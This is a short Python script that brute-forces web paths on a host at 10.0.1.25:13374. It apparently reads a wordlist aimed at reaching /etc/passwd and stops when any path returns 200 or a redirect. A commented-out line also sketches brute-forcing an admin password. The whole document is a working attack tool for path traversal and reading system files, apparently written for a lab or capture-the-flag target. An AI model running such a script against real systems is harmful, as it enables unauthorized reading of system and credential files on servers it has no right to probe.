import requests
import time

file = open("list_etc_password.txt")

paths = file.read()

path_list = paths.splitlines()
print('Brutefore Path starts... ')
count=0;

for path in path_list:
    try:
        ##time.sleep(1)  # delay 1 sec
        # url = f'http://localhost:'PORT'/PATH/FOR/API?username=admin&password={password}'
        url = f'http://10.0.1.25:13374/webapp/{path}'
        print("Url:"+url)
        out = requests.get(url)
        code = out.status_code
    except requests.ConnectionError:
        pass
    if code == 200 or code == 301 or code == 302:
        print('Path Exist:', path + " success:" + str(code))

    else:
        print('Path Not Found: error:', str(code) + "   -count: "+ str(count))
        count= count+1
    if code == 200 or code == 301 or code == 302:
        exit()
else:
    print('Path Not Found Program Exit')
